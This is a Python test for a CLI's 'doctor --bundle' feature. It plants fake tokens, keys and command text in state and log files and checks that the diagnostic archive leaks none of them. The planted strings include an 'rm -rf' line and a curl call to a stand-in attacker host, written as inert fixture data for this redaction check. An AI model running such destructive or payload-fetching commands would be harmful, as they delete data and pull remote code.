"""`unpeel doctor --bundle` redaction test.

Plants known secrets (tokens, keys, pairing secrets) in app-state.json and
JSON logs, builds the bundle, extracts it, and proves none of the secrets
occur anywhere in the archive.
"""

import sys, os, json, tarfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from harness import run_cli, run  # noqa: E402

# Known secrets planted in the fixture. If any of these byte strings appear
# in the bundle, redaction failed.
SECRETS = [
    "sk-test-SECRET-TOKEN-12345",
    "pairing-SECRET-CODE-67890",
    "api-key-SECRET-ABCDEF",
    "private-key-SECRET-XYZ",
]

# Planted command text and review payloads. These must NOT appear in
# logs.jsonl — the bundle must exclude command text, not just credentials.
PLANTED_COMMANDS = [
    "rm -rf /tmp/planted-command-ABC123",
    "curl https://evil.example.com/planted-payload-XYZ789",
]

PLANTED_REVIEW_PAYLOADS = [
    "planted-review-payload-DEF456",
    "sensitive-tool-arg-planted-GHI789",
]


def doctor_bundle(case):
    home = case.home

    # Plant secrets in app-state.json.
    state = {
        "theme": "dark",
        "device_token": SECRETS[0],
        "mobile": {
            "pairing_secret": SECRETS[1],
        },
        "connectors": {
            "my-conn": {
                "api_key": SECRETS[2],
            }
        },
        "private_key": SECRETS[3],
    }
    with open(home.path("app-state.json"), "w") as f:
        json.dump(state, f)

    # Plant secrets in a JSON log.
    os.makedirs(home.path("logs"), exist_ok=True)
    with open(home.path("logs", "host.jsonl"), "w") as f:
        f.write(json.dumps({
            "level": "info",
            "msg": "device connected",
            "token": SECRETS[0],
        }) + "\n")
        f.write(json.dumps({
            "level": "info",
            "msg": "pairing completed",
            "pairing_code": SECRETS[1],
        }) + "\n")
        # Plant command text and review payloads — these must be excluded
        # from the bundle's logs.jsonl, not just redacted.
        for cmd in PLANTED_COMMANDS:
            f.write(json.dumps({
                "level": "info",
                "msg": "tool executed",
                "command": cmd,
            }) + "\n")
        for payload in PLANTED_REVIEW_PAYLOADS:
            f.write(json.dumps({
                "level": "info",
                "msg": "review recorded",
                "payload": payload,
                "tool_args": payload,
            }) + "\n")

    # Build the bundle.
    bundle_path = home.path("bundle.tar.gz")
    r = run_cli(home, ["doctor", "--bundle", bundle_path], expect_ok=True)
    case.check("doctor --bundle exits 0", r.returncode == 0)
    case.check("bundle file exists", os.path.exists(bundle_path))

    # Extract and scan for secrets.
    extract_dir = home.path("bundle-extracted")
    os.makedirs(extract_dir, exist_ok=True)
    with tarfile.open(bundle_path, "r:gz") as tf:
        tf.extractall(extract_dir)

    found = []
    for root, dirs, files in os.walk(extract_dir):
        for fn in files:
            fp = os.path.join(root, fn)
            with open(fp, "rb") as fh:
                data = fh.read()
            for secret in SECRETS:
                if secret.encode() in data:
                    found.append(f"{fp}: {secret[:20]}...")

    case.check(
        "no secrets in bundle",
        not found,
        f"secrets leaked: {found}" if found else "",
    )

    # Planted command text and review payloads must NOT appear in logs.jsonl.
    # This proves the bundle excludes command text, not merely credentials.
    logs_path = os.path.join(extract_dir, "logs.jsonl")
    with open(logs_path, "rb") as fh:
        logs_data = fh.read()
    cmd_found = []
    for cmd in PLANTED_COMMANDS:
        if cmd.encode() in logs_data:
            cmd_found.append(cmd)
    case.check(
        "no planted command text in logs.jsonl",
        not cmd_found,
        f"commands leaked: {cmd_found}" if cmd_found else "",
    )
    payload_found = []
    for payload in PLANTED_REVIEW_PAYLOADS:
        if payload.encode() in logs_data:
            payload_found.append(payload)
    case.check(
        "no planted review payloads in logs.jsonl",
        not payload_found,
        f"payloads leaked: {payload_found}" if payload_found else "",
    )

    # The bundle must still contain the expected files.
    expected = ["versions.json", "config.redacted.json", "doctor.json",
                "stats.json", "logs.jsonl"]
    for fn in expected:
        case.check(f"bundle contains {fn}",
                   os.path.exists(os.path.join(extract_dir, fn)))

    # Redacted config must have [REDACTED] markers.
    with open(os.path.join(extract_dir, "config.redacted.json")) as f:
        redacted = f.read()
    case.check("redacted markers present", "[REDACTED]" in redacted)


run("doctor-bundle", doctor_bundle)
